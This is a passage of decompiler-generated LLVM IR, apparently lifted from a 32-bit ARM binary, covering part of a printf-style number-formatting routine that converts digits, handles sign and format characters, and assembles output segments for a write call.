  %v5_1665c = load i32, i32* %r2.global-to-local, align 4
  %v6_1665c = add i32 %v5_1665c, -1
  %v7_1665c = inttoptr i32 %v6_1665c to i8*
  store i8 48, i8* %v7_1665c, align 1
  %v8_1665c = load i32, i32* %r2.global-to-local, align 4
  %v9_1665c = add i32 %v8_1665c, -1
  store i32 %v9_1665c, i32* %r2.global-to-local, align 4
  %v0_16660.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16694.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_16664

dec_label_pc_16664:                               ; preds = %bb240, %dec_label_pc_16654, %dec_label_pc_16964, %dec_label_pc_16648
  %v1_16694 = phi i32 [ %v1_16618, %dec_label_pc_16648 ], [ %v1_16618, %dec_label_pc_16964 ], [ %v1_16694.pre.pre, %bb240 ], [ %v1_16618, %dec_label_pc_16654 ]
  %v1_1670c30 = phi i32 [ 0, %dec_label_pc_16648 ], [ 0, %dec_label_pc_16964 ], [ %v0_16660.pre, %bb240 ], [ %v0_16654, %dec_label_pc_16654 ]
  store i32 %v1_1670c30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_16670 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_16670, i32* %r3.global-to-local, align 4
  %v0_1667c = load i32, i32* %r2.global-to-local, align 4
  %v1_1667c = inttoptr i32 %v0_1667c to i8*
  %v2_1667c = load i8, i8* %v1_1667c, align 1
  %v3_1667c = zext i8 %v2_1667c to i32
  store i32 %v3_1667c, i32* %r3.global-to-local, align 4
  %v5_1667c = add i32 %v0_1667c, 1
  store i32 %v5_1667c, i32* %r2.global-to-local, align 4
  %v1_16680 = icmp slt i32 %v1_1670c30, 0
  %v2_16680 = icmp eq i32 %v1_1670c30, 0
  store i1 %v2_16680, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_1667c, i32* %r6.global-to-local, align 4
  store i32 %v3_1667c, i32* %stack_var_-42, align 4
  %v2_16694 = sub i32 %v1_16694, %v5_1667c
  store i32 %v2_16694, i32* %ip.global-to-local, align 4
  br i1 %v1_16680, label %.thread, label %dec_label_pc_166a0

.thread:                                          ; preds = %dec_label_pc_16664
  %v5_16698 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_16698, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1671c

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16664
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_166a4 = sub i32 %v1_1670c30, %v2_16694
  %v4_166a4 = xor i32 %v2_16694, %v1_1670c30
  %v5_166a4 = xor i32 %v2_166a4, %v1_1670c30
  %v6_166a4 = and i32 %v5_166a4, %v4_166a4
  %v7_166a4 = icmp slt i32 %v6_166a4, 0
  %v8_166a4 = icmp slt i32 %v2_166a4, 0
  %v9_166a4 = icmp eq i32 %v1_1670c30, %v2_16694
  store i1 %v9_166a4, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_166b0 = xor i1 %v8_166a4, %v7_166a4
  br i1 %v2_166b0, label %dec_label_pc_166fc, label %dec_label_pc_166b4

dec_label_pc_166b4:                               ; preds = %dec_label_pc_166a0
  store i32 %v2_166a4, i32* %r2.global-to-local, align 4
  %v2_166b8 = icmp eq i32 %v2_166a4, 0
  store i1 %v2_166b8, i1* %cpsr_z.global-to-local, align 1
  %v2_166bc = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_166bc, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_166a4, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_166d0

.thread148:                                       ; preds = %dec_label_pc_166b4
  %v7_166c4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_166c4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_166d0:                               ; preds = %dec_label_pc_166b4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v2_166e0 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_166e0, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1671c

dec_label_pc_166fc:                               ; preds = %dec_label_pc_166a0
  store i1 %v2_16680, i1* %cpsr_z.global-to-local, align 1
  %v2_16700 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16700, i32* %lr.global-to-local, align 4
  br i1 %v2_16680, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_166fc
  %v3_16708 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_16708, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_166fc
  %v3_1670c = sub i32 %v2_16694, %v1_1670c30
  store i32 %v3_1670c, i32* %ip.global-to-local, align 4
  %v3_1671063 = add i32 %v5_1667c, %v1_1670c30
  store i32 %v3_1671063, i32* %r6.global-to-local, align 4
  %v3_16714 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_16714, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_1675c265 = phi i32 [ %v3_16708, %bb242 ], [ %v3_16714, %bb243 ], [ %v7_166c4, %.thread148 ]
  %v0_16730102 = phi i32 [ %v2_16694, %bb242 ], [ %v3_1670c, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1671c

dec_label_pc_1671c:                               ; preds = %.thread, %dec_label_pc_166d0, %.thread34
  %v1_1675c = phi i32 [ %v2_166e0, %dec_label_pc_166d0 ], [ %v1_1675c265, %.thread34 ], [ %v5_16698, %.thread ]
  %v0_16770109 = phi i32 [ -1, %dec_label_pc_166d0 ], [ -1, %.thread34 ], [ %v1_1670c30, %.thread ]
  %v0_16730 = phi i32 [ 0, %dec_label_pc_166d0 ], [ %v0_16730102, %.thread34 ], [ %v2_16694, %.thread ]
  %v3_1671c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1671c, i32* %r2.global-to-local, align 4
  %v1_16720 = add i32 %v3_1671c, 12
  %v2_16720 = inttoptr i32 %v1_16720 to i32*
  %v3_16720 = load i32, i32* %v2_16720, align 4
  %v1_16724 = and i32 %v3_16720, 16
  store i32 %v1_16724, i32* %r4.global-to-local, align 4
  %v2_16724 = icmp eq i32 %v1_16724, 0
  %tmp270 = zext i1 %v2_16724 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_16730 = icmp eq i32 %v0_16730, 0
  store i1 %v2_16730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16730, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_1671c
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1674c

bb246:                                            ; preds = %dec_label_pc_1671c
  store i1 %v2_16724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16724, label %dec_label_pc_16740, label %dec_label_pc_1674c

dec_label_pc_16740:                               ; preds = %bb246
  %v0_16740 = load i32, i32* %sb.global-to-local, align 4
  %v7_16740 = icmp eq i32 %v0_16740, 103
  store i1 %v7_16740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16740, label %dec_label_pc_16770, label %bb247

bb247:                                            ; preds = %dec_label_pc_16740
  %v1_16744 = load i32, i32* %fp.global-to-local, align 4
  %v3_16744 = icmp eq i32 %v1_16744, 0
  store i1 %v3_16744, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_16744, 1
  br i1 %tmp248, label %dec_label_pc_16770, label %dec_label_pc_1674c

dec_label_pc_1674c:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33052), i32* %r3.global-to-local, align 4
  %v2_1675c = inttoptr i32 %v1_1675c to i32*
  store i32 112, i32* %v2_1675c, align 4
  %v0_16760 = load i32, i32* %r3.global-to-local, align 4
  %v1_16760 = add i32 %v0_16760, 16
  store i32 %v1_16760, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_16768 = load i32, i32* %r7.global-to-local, align 4
  %v1_16768 = add i32 %v0_16768, 4
  %v2_16768 = inttoptr i32 %v1_16768 to i32*
  store i32 1, i32* %v2_16768, align 4
  %v4_16768 = add i32 %v0_16768, 8
  %v5_16768 = inttoptr i32 %v4_16768 to i32*
  %v6_16768 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_16768, i32* %v5_16768, align 4
  %v0_1676c = load i32, i32* %r7.global-to-local, align 4
  %v1_1676c = add i32 %v0_1676c, 12
  store i32 %v1_1676c, i32* %r7.global-to-local, align 4
  %v0_16770.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16770

dec_label_pc_16770:                               ; preds = %dec_label_pc_16740, %bb247, %dec_label_pc_1674c
  %v1_16790 = phi i32 [ %v1_1675c, %bb247 ], [ %v1_1676c, %dec_label_pc_1674c ], [ %v1_1675c, %dec_label_pc_16740 ]
  %v0_16770 = phi i32 [ %v0_16770109, %bb247 ], [ %v0_16770.pre, %dec_label_pc_1674c ], [ %v0_16770109, %dec_label_pc_16740 ]
  %v1_16770 = add i32 %v0_16770, 1
  store i32 %v1_16770, i32* %lr.global-to-local, align 4
  %v6_16770 = icmp slt i32 %v1_16770, 0
  %v7_16770 = icmp eq i32 %v1_16770, 0
  store i1 %v7_16770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_16770, label %dec_label_pc_16778, label %dec_label_pc_1679c

dec_label_pc_16778:                               ; preds = %dec_label_pc_16770
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v1_16788 = sub i32 -1, %v0_16770
  store i32 %v1_16788, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_16790 = inttoptr i32 %v1_16790 to i32*
  store i32 176, i32* %v2_16790, align 4
  %v0_16794 = load i32, i32* %r7.global-to-local, align 4
  %v1_16794 = add i32 %v0_16794, 4
  %v2_16794 = inttoptr i32 %v1_16794 to i32*
  %v3_16794 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_16794, i32* %v2_16794, align 4
  %v4_16794 = add i32 %v0_16794, 8
  %v5_16794 = inttoptr i32 %v4_16794 to i32*
  %v6_16794 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_16794, i32* %v5_16794, align 4
  %v0_16798 = load i32, i32* %r7.global-to-local, align 4
  %v1_16798 = add i32 %v0_16798, 12
  store i32 %v1_16798, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1679c

dec_label_pc_1679c:                               ; preds = %dec_label_pc_16770, %dec_label_pc_16778
  %v2_167a4 = phi i32 [ %v1_16790, %dec_label_pc_16770 ], [ %v1_16798, %dec_label_pc_16778 ]
  %v0_1679c = load i32, i32* %ip.global-to-local, align 4
  %v2_1679c = icmp eq i32 %v0_1679c, 0
  store i1 %v2_1679c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1679c, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_1679c
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_167a4 = inttoptr i32 %v2_167a4 to i32*
  store i32 112, i32* %v3_167a4, align 4
  %v1_167a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_167a8 = load i32, i32* %r7.global-to-local, align 4
  %v3_167a8 = add i32 %v2_167a8, 8
  %v4_167a8 = inttoptr i32 %v3_167a8 to i32*
  store i32 %v1_167a8, i32* %v4_167a8, align 4
  %v1_167ac = load i32, i32* %ip.global-to-local, align 4
  %v2_167ac = load i32, i32* %r7.global-to-local, align 4
  %v3_167ac = add i32 %v2_167ac, 4
  %v4_167ac = inttoptr i32 %v3_167ac to i32*
  store i32 %v1_167ac, i32* %v4_167ac, align 4
  %v1_167b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_167b0 = add i32 %v1_167b0, 12
  store i32 %v2_167b0, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1679c, %bb249
  %v1_167e8 = phi i32 [ %v2_167a4, %dec_label_pc_1679c ], [ %v2_167b0, %bb249 ]
  %v0_167b4 = load i32, i32* %sb.global-to-local, align 4
  %v7_167b4 = icmp eq i32 %v0_167b4, 103
  store i1 %v7_167b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_167b4, label %dec_label_pc_167bc, label %dec_label_pc_167c4

dec_label_pc_167bc:                               ; preds = %.thread46
  %v0_167bc = load i32, i32* %r4.global-to-local, align 4
  %v2_167bc = icmp eq i32 %v0_167bc, 0
  store i1 %v2_167bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_167bc, label %dec_label_pc_167f4, label %dec_label_pc_167c4

dec_label_pc_167c4:                               ; preds = %.thread46, %dec_label_pc_167bc
  %v0_167c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_167c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_167c4 = sub i32 %v1_167c4, %v0_167c4
  store i32 %v2_167c4, i32* %r1.global-to-local, align 4
  %v1_167c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_167c8 = sub i32 %v2_167c4, %v1_167c8
  %v4_167c8 = xor i32 %v1_167c8, %v2_167c4
  %v5_167c8 = xor i32 %v2_167c8, %v2_167c4
  %v6_167c8 = and i32 %v5_167c8, %v4_167c8
  %v7_167c8 = icmp slt i32 %v6_167c8, 0
  %v8_167c8 = icmp slt i32 %v2_167c8, 0
  %v9_167c8 = icmp eq i32 %v2_167c4, %v1_167c8
  store i1 %v9_167c8, i1* %cpsr_z.global-to-local, align 1
  %v2_167cc = xor i1 %v8_167c8, %v7_167c8
  br i1 %v2_167cc, label %dec_label_pc_167d0, label %dec_label_pc_167f4

dec_label_pc_167d0:                               ; preds = %dec_label_pc_167c4
  %v2_167dc = sub i32 %v1_167c8, %v2_167c4
  store i32 %v2_167dc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_167e8 = inttoptr i32 %v1_167e8 to i32*
  store i32 176, i32* %v2_167e8, align 4
  %v0_167ec = load i32, i32* %r7.global-to-local, align 4
  %v1_167ec = add i32 %v0_167ec, 4
  %v2_167ec = inttoptr i32 %v1_167ec to i32*
  %v3_167ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_167ec, i32* %v2_167ec, align 4
  %v4_167ec = add i32 %v0_167ec, 8
  %v5_167ec = inttoptr i32 %v4_167ec to i32*
  %v6_167ec = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_167ec, i32* %v5_167ec, align 4
  %v0_167f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_167f0 = add i32 %v0_167f0, 12
  store i32 %v1_167f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_167f4

dec_label_pc_167f4:                               ; preds = %dec_label_pc_167c4, %dec_label_pc_167bc, %dec_label_pc_167d0
  %v1_16888.pre.pre = phi i32 [ %v1_167e8, %dec_label_pc_167c4 ], [ %v1_167e8, %dec_label_pc_167bc ], [ %v1_167f0, %dec_label_pc_167d0 ]
  %v0_167f4 = load i32, i32* %r8.global-to-local, align 4
  %v7_167f4 = icmp eq i32 %v0_167f4, 102
  store i1 %v7_167f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_167f4, label %dec_label_pc_1687c, label %dec_label_pc_167fc

dec_label_pc_167fc:                               ; preds = %dec_label_pc_167f4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_16800 = load i32, i32* %r0.global-to-local, align 4
  %v1_16800 = icmp slt i32 %v0_16800, 0
  %v2_16800 = icmp eq i32 %v0_16800, 0
  store i1 %v2_16800, i1* %cpsr_z.global-to-local, align 1
  %v4_16804 = select i1 %tmp275, i32 %v4_16520126130, i32 101
  store i32 %v4_16804, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_16814 = sub i32 0, %v0_16800
  %storemerge158 = select i1 %v1_16800, i32 %v4_16814, i32 %v0_16800
  %tmp271 = ashr i32 %v0_16800, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1681c = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1681c, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16824

dec_label_pc_16824:                               ; preds = %dec_label_pc_16854, %dec_label_pc_16824, %dec_label_pc_167fc
  %v2_1683c = phi i32 [ %v2_1681c, %dec_label_pc_167fc ], [ %v6_1683c, %dec_label_pc_16824 ], [ %v6_1683c, %dec_label_pc_16854 ]
  %v0_16834 = phi i32 [ %storemerge158, %dec_label_pc_167fc ], [ %v2_16840, %dec_label_pc_16824 ], [ %v2_16840, %dec_label_pc_16854 ]
  %v3_1682c = urem i32 %v0_16834, 10
  %v1_16830 = or i32 %v3_1682c, 48
  store i32 %v1_16830, i32* %r3.global-to-local, align 4
  store i32 %v0_16834, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1683c = trunc i32 %v1_16830 to i8
  %v3_1683c = add i32 %v2_1683c, -1
  %v4_1683c = inttoptr i32 %v3_1683c to i8*
  store i8 %v1_1683c, i8* %v4_1683c, align 1
  %v5_1683c = load i32, i32* %r6.global-to-local, align 4
  %v6_1683c = add i32 %v5_1683c, -1
  store i32 %v6_1683c, i32* %r6.global-to-local, align 4
  %v0_16840 = load i32, i32* %r0.global-to-local, align 4
  %v1_16840 = load i32, i32* %r1.global-to-local, align 4
  %v2_16840 = sdiv i32 %v0_16840, %v1_16840
  store i32 %v2_16840, i32* %r0.global-to-local, align 4
  %v0_16844 = load i32, i32* %r8.global-to-local, align 4
  %v1_16844 = add i32 %v0_16844, 1
  store i32 %v1_16844, i32* %r8.global-to-local, align 4
  %v7_16848 = icmp eq i32 %v1_16844, 3
  store i1 %v7_16848, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16840, i32* %r5.global-to-local, align 4
  br i1 %v7_16848, label %dec_label_pc_16824, label %dec_label_pc_16854

dec_label_pc_16854:                               ; preds = %dec_label_pc_16824
  %v2_16854 = icmp eq i32 %v2_16840, 0
  store i1 %v2_16854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16854, label %dec_label_pc_1685c, label %dec_label_pc_16824

dec_label_pc_1685c:                               ; preds = %dec_label_pc_16854
  %v1_1685c = add i32 %v5_1683c, -2
  store i32 %v1_1685c, i32* %r3.global-to-local, align 4
  %v0_16860 = load i32, i32* %sl.global-to-local, align 4
  %v1_16860 = trunc i32 %v0_16860 to i8
  %v4_16860 = inttoptr i32 %v1_1685c to i8*
  store i8 %v1_16860, i8* %v4_16860, align 1
  %v0_16864 = load i32, i32* %r3.global-to-local, align 4
  %v1_16864 = add i32 %v0_16864, -1
  store i32 %v1_16864, i32* %r2.global-to-local, align 4
  %v0_16868 = load i32, i32* %r4.global-to-local, align 4
  %v1_16868 = trunc i32 %v0_16868 to i8
  %v4_16868 = inttoptr i32 %v1_16864 to i8*
  store i8 %v1_16868, i8* %v4_16868, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_16870 = load i32, i32* %r7.global-to-local, align 4
  %v1_16870 = inttoptr i32 %v0_16870 to i32*
  store i32 112, i32* %v1_16870, align 4
  %v3_16870 = add i32 %v0_16870, 4
  %v4_16870 = inttoptr i32 %v3_16870 to i32*
  %v5_16870 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_16870, i32* %v4_16870, align 4
  %v0_16874 = load i32, i32* %r2.global-to-local, align 4
  %v1_16874 = load i32, i32* %r7.global-to-local, align 4
  %v2_16874 = add i32 %v1_16874, 8
  %v3_16874 = inttoptr i32 %v2_16874 to i32*
  store i32 %v0_16874, i32* %v3_16874, align 4
  %v0_16878 = load i32, i32* %r7.global-to-local, align 4
  %v1_16878 = add i32 %v0_16878, 12
  store i32 %v1_16878, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1687c

dec_label_pc_1687c:                               ; preds = %dec_label_pc_167f4, %.thread124, %dec_label_pc_1685c
  %v1_16888.pre = phi i32 [ %v2_16354, %.thread124 ], [ %v1_16878, %dec_label_pc_1685c ], [ %v1_16888.pre.pre, %dec_label_pc_167f4 ]
  %v2_1687c = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1687c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16880

dec_label_pc_16880:                               ; preds = %dec_label_pc_16880, %dec_label_pc_1687c
  %v0_16880 = phi i32 [ %v2_1687c, %dec_label_pc_1687c ], [ %v4_16880, %dec_label_pc_16880 ]
  %stack_var_-188.0 = phi i32 [ %v3_161f0, %dec_label_pc_1687c ], [ %v2_1688c, %dec_label_pc_16880 ]
  %v1_16880 = inttoptr i32 %v0_16880 to i32*
  %v2_16880 = load i32, i32* %v1_16880, align 4
  store i32 %v2_16880, i32* %r3.global-to-local, align 4
  %v4_16880 = add i32 %v0_16880, 12
  store i32 %v4_16880, i32* %r2.global-to-local, align 4
  %v3_16888 = icmp ult i32 %v4_16880, %v1_16888.pre
  %v2_1688c = sub i32 %stack_var_-188.0, %v2_16880
  store i32 %v2_1688c, i32* %ip.global-to-local, align 4
  br i1 %v3_16888, label %dec_label_pc_16880, label %dec_label_pc_16898

dec_label_pc_16898:                               ; preds = %dec_label_pc_16880
  %v3_16898 = load i8, i8* %stack_var_-46, align 1
  %v4_16898 = sext i8 %v3_16898 to i32
  store i32 %v4_16898, i32* %r3.global-to-local, align 4
  store i32 %v4_16898, i32* %r2.global-to-local, align 4
  %v2_1689c = icmp eq i8 %v3_16898, 0
  store i1 %v2_1689c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1689c, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_16898
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_16898, %bb253
  %v1_168fc = phi i32 [ %v4_16898, %dec_label_pc_16898 ], [ 1, %bb253 ]
  %v2_168a4 = sub i32 %v2_1688c, %v1_168fc
  store i32 %v2_168a4, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_168ac = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_168ac, i32* %r3.global-to-local, align 4
  %v2_168b0 = icmp eq i32 %v2_168a4, 0
  store i1 %v2_168b0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_168a4, 1
  br i1 %tmp255, label %dec_label_pc_16918, label %dec_label_pc_168c4

dec_label_pc_168c4:                               ; preds = %bb254
  %v3_168c4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_168c4, i32* %lr.global-to-local, align 4
  %v1_168c8 = add i32 %v3_168c4, 12
  %v2_168c8 = inttoptr i32 %v1_168c8 to i32*
  %v3_168c8 = load i32, i32* %v2_168c8, align 4
  store i32 %v3_168c8, i32* %r3.global-to-local, align 4
  %v1_168cc = and i32 %v3_168c8, 8
  %v2_168cc = icmp eq i32 %v1_168cc, 0
  store i1 %v2_168cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168cc, label %dec_label_pc_168f0, label %dec_label_pc_168d4

dec_label_pc_168d4:                               ; preds = %dec_label_pc_168c4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33049), i32* %r3.global-to-local, align 4
  %v1_168e4 = add i32 %v1_16888.pre, 12
  store i32 %v1_168e4, i32* %r6.global-to-local, align 4
  %v1_168e8 = inttoptr i32 %v1_16888.pre to i32*
  store i32 160, i32* %v1_168e8, align 4
  %v3_168e8 = add i32 %v1_16888.pre, 4
  %v4_168e8 = inttoptr i32 %v3_168e8 to i32*
  %v5_168e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_168e8, i32* %v4_168e8, align 4
  %v6_168e8 = add i32 %v1_16888.pre, 8
  %v7_168e8 = inttoptr i32 %v6_168e8 to i32*
  %v8_168e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_168e8, i32* %v7_168e8, align 4
  br label %dec_label_pc_1691c

dec_label_pc_168f0:                               ; preds = %dec_label_pc_168c4
  store i32 %v3_168c4, i32* %ip.global-to-local, align 4
  %v1_168f4 = add i32 %v3_168c4, 16
  %v2_168f4 = inttoptr i32 %v1_168f4 to i32*
  %v3_168f4 = load i32, i32* %v2_168f4, align 4
  store i32 %v3_168f4, i32* %r3.global-to-local, align 4
  %v7_168f8 = icmp eq i32 %v3_168f4, 48
  store i1 %v7_168f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_168f8, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_168f0
  store i32 %v2_1688c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16918

.thread54.thread70:                               ; preds = %dec_label_pc_168f0
  %v4_16904 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_16888.pre, i32* %r6.global-to-local, align 4
  %v3_1690c = add i32 %v4_16904, %v2_168a4
  store i32 %v3_1690c, i32* %r3.global-to-local, align 4
  store i32 %v3_1690c, i32* %stack_var_-164, align 4
  br label %dec_label_pc_1691c

dec_label_pc_16918:                               ; preds = %bb256, %bb254
  store i32 %v1_16888.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1691c

dec_label_pc_1691c:                               ; preds = %.thread54.thread70, %dec_label_pc_168d4, %dec_label_pc_16918
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_16920 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_16920, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %dec_label_pc_1694c, %dec_label_pc_1691c
  %v0_16924 = phi i32 [ %v1_16940, %dec_label_pc_1694c ], [ %v2_16920, %dec_label_pc_1691c ]
  %v1_16924 = inttoptr i32 %v0_16924 to i32*
  %v2_16924 = load i32, i32* %v1_16924, align 4
  store i32 %v2_16924, i32* %r1.global-to-local, align 4
  %v3_16924 = add i32 %v0_16924, 4
  %v4_16924 = inttoptr i32 %v3_16924 to i32*
  %v5_16924 = load i32, i32* %v4_16924, align 4
  store i32 %v5_16924, i32* %r2.global-to-local, align 4
  %v6_16924 = add i32 %v0_16924, 8
  %v7_16924 = inttoptr i32 %v6_16924 to i32*
  %v8_16924 = load i32, i32* %v7_16924, align 4
  store i32 %v8_16924, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 92472, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_16938 = load i32, i32* %r5.global-to-local, align 4
  %v1_16938 = add i32 %v0_16938, 4
  %v2_16938 = inttoptr i32 %v1_16938 to i32*
  %v3_16938 = load i32, i32* %v2_16938, align 4
  store i32 %v3_16938, i32* %r3.global-to-local, align 4
  %v0_1693c = load i32, i32* %r0.global-to-local, align 4
  %v9_1693c = icmp eq i32 %v0_1693c, %v3_16938
  store i1 %v9_1693c, i1* %cpsr_z.global-to-local, align 1
  %v1_16940 = add i32 %v0_16938, 12
  store i32 %v1_16940, i32* %r5.global-to-local, align 4
  br i1 %v9_1693c, label %dec_label_pc_1694c, label %bb257

bb257:                                            ; preds = %dec_label_pc_16924
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1696c

dec_label_pc_1694c:                               ; preds = %dec_label_pc_16924
  %v0_16950.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1694c = load i32, i32* %r6.global-to-local, align 4
  %v3_1694c = icmp ult i32 %v1_16940, %v1_1694c
  %v9_1694c = icmp eq i32 %v1_16940, %v1_1694c
  store i1 %v9_1694c, i1* %cpsr_z.global-to-local, align 1
  %v2_16950 = add i32 %v0_16950.pre, %v3_16938
  store i32 %v2_16950, i32* %r7.global-to-local, align 4
  br i1 %v3_1694c, label %dec_label_pc_16924, label %dec_label_pc_1696c

dec_label_pc_16964:                               ; preds = %.thread21, %bb239
  %v0_16964 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16964, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_16664

dec_label_pc_1696c:                               ; preds = %dec_label_pc_1694c, %bb257
  %v0_1696c = phi i32 [ -1, %bb257 ], [ %v2_16950, %dec_label_pc_1694c ]
  store i32 %v0_1696c, i32* %r0.global-to-local, align 4
  store i32 %v27_161a8, i32* @lr, align 4
  ret i32 %v0_1696c

; uselistorder directives
  uselistorder i32 %v0_1696c, { 1, 0 }
  uselistorder i32 %v1_1694c, { 1, 0 }
  uselistorder i32 %v1_16940, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16924, { 2, 1, 0 }
  uselistorder i32 %v3_168c4, { 1, 0, 2, 3 }
